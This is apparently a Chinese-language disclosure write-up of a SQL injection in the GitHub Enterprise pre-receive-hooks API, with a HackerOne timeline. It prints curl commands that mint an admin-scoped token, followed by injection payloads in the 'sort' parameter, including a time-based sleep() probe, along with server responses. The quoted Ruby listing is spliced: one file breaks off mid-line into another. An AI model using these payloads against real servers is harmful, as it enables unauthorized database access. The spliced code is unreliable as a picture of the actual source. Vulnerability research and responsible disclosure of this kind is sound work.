    Middleware                GitHub::DefaultRoleMiddleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::Callbacks, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupport
    Application root          /data/github/9fcdcc8
    Environment               production
    Database adapter          githubmysql2
    Database schema version   20161003225024
大部分的代码使用 Ruby 撰写，可以看出 GitHub 很喜欢使用 `Ruby on Rails` 及 `Sinatra` 等 Ruby
网页框架进行网页开发
  * 目录 `/data/github/` 看起来是跑在 `80/tcp` `443/tcp` 的服务，经过一些指纹分析，看起来这份原始码是真的跑在 `github.com`、 `gist.github.com` 及 `api.github.com` 的原始码!
  * `/data/render/` 看起来是跑在 `render.githubusercontent.com` 的原始码
  * `/data/enterprise-manage/` 是 `8443/tcp` 管理介面的原始码
GitHub Enterprise 的原始码同时也是 `GitHub.com` 的原始码，但两者实际上运行会有差异吗? 经过一点研究后发现这份代码使用了
`enterprise?` 及 `dotcom?` 这两个方法来判断当前是在 `Enterprise 模式` 或是 `GitHub dot com 模式`
，所以有些只有在 `Enterprise` 才有的功能从 `GitHub.com` 上会无法访问，不过猜测两者的 Code Base 应该是一样的没错!
* * *
## 漏洞
我大约花了一个礼拜的时候进行代码审查跟发现漏洞，本身并不是很熟 Ruby (Ruby 很魔法，本身是 Python 派XD)，但就是边看边学
相信也有很多人也是这样，先学会 SQL Injection 才学会 SQL，先学会逆向工程组合语言才学会 C 语言的 :P
大致上的行程差不多是:
  * Day 1 - 设定 VM
  * Day 2 - 设定 VM
  * Day 3 - 代码审查，顺便学 Rails 
  * Day 4 - 代码审查，顺便学 Rails 
  * Day 5 - 代码审查，顺便学 Rails 
  * Day 6 - 耶，找到漏洞惹!
漏洞存在于 `PreReceiveHookTarget` 这个 model 上!
整个漏洞发生的核心原因在于 `/data/github/current/app/model/pre_receive_hook_target.rb`
这个档案的第 45 行
    33   scope :sorted_by, -> (order, direction = nil) {
    34     direction = "DESC" == "#{direction}".upcase ? "DESC" : "ASC"
    35     select( org = find_org!
    12     @documentation_url << "#list-pre-receive-hooks"
    13     targets = PreReceiveHookTarget.visible_for_hookable(org)
    14     targets = sort(targets).paginate(pagination)
    15     GitHub::PrefillAssociations.for_pre_receive_hook_targets targets
    16     deliver :pre_receive_org_target_hash, targets
    17   end
    ...
    60   def sort(scope)
    61     scope.sorted_by("hook.#{params[:sort] || "id"}", params[:direction] || "asc")
    62   end
使用者参数 `params[:sort]` 直接被代入到 `scope.sorted_by` 中，所以只要在
`/organizations/:organization_id/pre-receive-hooks` 这个路由上的 `sort` 参数上插入恶意的 SQL
就可以产生 SQL Injection!
由于这个漏洞是在 GitHub Enterprise 的 API 功能中，在触发漏洞之前必须先有一组合法的 `access_token` 并且拥有
`admin:pre_receive_hook` 的权限才可以。
不过这点对我们来说也不是难事，经过一段时间的代码审查发现可以透过下面的指令来取得相对应的权限:
    $ curl -k -u 'nogg:nogg' 'https://192.168.187.145/api/v3/authorizations' \
    -d '{"scopes":"admin:pre_receive_hook","note":"x"}'
    {
      "id": 4,
      "url": "https://192.168.187.145/api/v3/authorizations/4",
      "app": {
        "name": "x",
        "url": "https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/",
        "client_id": "00000000000000000000"
      },
      "token": "????????",
      "hashed_token": "1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4",
      "token_last_eight": "1fadac36",
      "note": "x",
      "note_url": null,
      "created_at": "2017-01-05T22:17:32Z",
      "updated_at": "2017-01-05T22:17:32Z",
      "scopes": [
        "admin:pre_receive_hook"
      ],
      "fingerprint": null
    }
一但有了 `access_token` ，接著就可以用以下的指令触发漏洞:
    $ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \
    'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+information_schema.tables+limit+1,1)'
    [
    ]
    $ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \
    'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,(select+1+from+mysql.user+limit+1,1)'
    {
      "message": "Server Error",
      "documentation_url": "https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks"
    }
    $ curl -k -H 'Accept:application/vnd.github.eye-scream-preview' \
    'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&sort=id,if(user()="github@localhost",sleep(5),user())
    {
        ...
    }
使用 Time-Based SQL Injection 判断资料库使用者是否为 `github@localhost`
* * *
# Timeline
  * 2016/12/26 05:48 透过 HackerOne 回报漏洞给 GitHub 
  * 2016/12/26 08:39 GitHub 回复已确认漏洞并且正在修复中
  * 2016/12/26 15:48 提供更多漏洞细节给 GitHub
  * 2016/12/28 02:44 GitHub 回复漏洞会在下一个版本的 GitHub Enterprise 中修复
  * 2017/01/04 06:41 GitHub 提供 $5,000 USD 的奖金
  * 2017/01/05 02:37 询问如果要发表 Blog 的话是否有需要注意的地方?
  * 2017/01/05 03:06 GitHub 回复没问题，请发!
  * 2017/01/05 07:06 GitHub Enterprise 2.8.5 发表!
* * *